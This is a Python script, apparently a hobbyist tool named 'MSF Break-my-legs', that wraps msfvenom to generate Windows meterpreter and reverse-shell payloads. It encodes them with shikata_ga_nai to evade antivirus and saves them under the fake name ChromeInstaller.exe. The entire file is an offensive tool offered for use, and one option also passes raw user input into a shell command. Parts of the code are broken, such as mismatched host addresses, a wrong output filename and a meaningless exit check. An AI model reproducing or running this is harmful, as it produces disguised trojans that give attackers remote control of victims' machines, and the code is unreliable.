import pyfiglet
import os
import termcolor
import time, sys
from termcolor import colored
import subprocess
from prettytable import PrettyTable
#create payloads and more with MSF_FCR
gezet = pyfiglet.figlet_format("MSF Break-my-legs")
color = colored(gezet, "green")
for x in color:
    sys.stdout.write(x)
    sys.stdout.flush()
    time.sleep(0.005)

print()
tab = PrettyTable()
tab.field_names =  ["Description", "Publisher"]
tab.add_row(["\033[0;32mCreate payloads and exploits directly through this tool!\033[0m \n \033[0;31mMade with hate.\033[0m", "Panz3rByte"])
tab.add_row(["(The producer is not responsable for any damage on any devices.)", ""])
print(tab)
print()

lios = [" \033[0;31m$\033[0m Create MSF meterpreter-shell (reverse_tcp) payload", " \033[0;31m$\033[0m Create MSF simple reverse-shell (windows/shell_reverse_tcp)", " \033[0;31m$\033[0m Encrypt MSF payload with Shikata-GA-NAI", " \033[0;31m$\033[0m Create remote desktop payload (encrypted with S.G.N-Encryption)", " \033[0;31m$\033[0m Create with exploit injected PDF-file (reverse shell) (\033[0;31mSOON\033[0m)"," \033[0;31m$\033[0m Create with exploit injected PDF-file (remote desktop control) (\033[0;31mSOON\033[0m)" ]
for x in lios:
    print(x)
print()
while True:
    potion = int(input("  --->  "))
    if potion == 1:
        log1 = "Creating and saving the meterpreter-shell as ChromeInstaller.exe...\n"
        for z in log1:
            sys.stdout.write(z)
            sys.stdout.flush()
            time.sleep(0.005)
        log2 = "Please enter type 'exit' as soon as the msf-db starts!\n"
        for x in log2:
            sys.stdout.write(x)
            sys.stdout.flush()
            time.sleep(0.005)
        print("Default RHOST = 192.168.0.3 LHOST = 192.0.0.8 LPORT= 7000.")
        input("If you want to configure first, press now CTRL+C or enter to continue if you finished.")
        subprocess.run("sudo msfdb run && msfvenom -p windows/meterpreter/reverse_tcp RHOST=192.168.0.3 LHOST=192.168.0.8 LPORT=7000 -e x86/shikata_ga_nai -i 5 -f exe > ChromeInstaller.exe && exit", shell=True)
        print()
        print("Success!")
    elif potion == 2:
        lo2 = "Creating and saving the meterpreter-shell as ChromeInstaller2.exe..."
        lo1 = "Please enter type 'exit' as soon as the msf-db starts! "
        for x in lo2:
            sys.stdout.write(x)
            sys.stdout.flush()
            time.sleep(0.005)
        for z in lo1:
            sys.stdout.write(z)
            sys.stdout.flush()
            time.sleep(0.005)
        print("Default RHOST = 192.168.0.3 LHOST = 192.0.0.8 LPORT= 7000.")
        input("If you want to configure first, press now CTRL+C or enter to continue if you finished.")
        subprocess.run("sudo msfdb run && msfvenom -p windows/shell_reverse_tcp RHOST=192.168.0.3 LHOST=192.0.0.8 LPORT=7000 -e x86/shikata_ga_nai -i 5 -f exe > ChromeInstaller.exe && exit", shell=True)
    elif potion == 3:
        op = input("Please enter the path to payload (with file, only exe allowed!): ")
        log = "Converting to shell code..."
        for x in log:
            sys.stdout.write(x)
            sys.stdout.flush()
            time.sleep(0.005)
        subprocess.run(f"msfvenom -p windows/exec CMD={op} -f raw > shcd.bin", shell=True)
        subprocess.run("cat shcd.bin | msfvenom -p - -a x64 -e x64/shikata_ga_nai -i 5 -f raw > enx_shcd.bin", shell=True)  #umschreiben und nochmal in shellcode ausgeben (enx_shcd.bin)
        subprocess.run("msfvenom -p windows/exec CMD=shcd.bin -e x86/shikata_ga_nai -i 5 -f exe > finished_PLFILE.exe", shell=True)
        print("success!")

    elif potion == ValueError and str:
        print("Closing MSF_FCR...")
        quit()


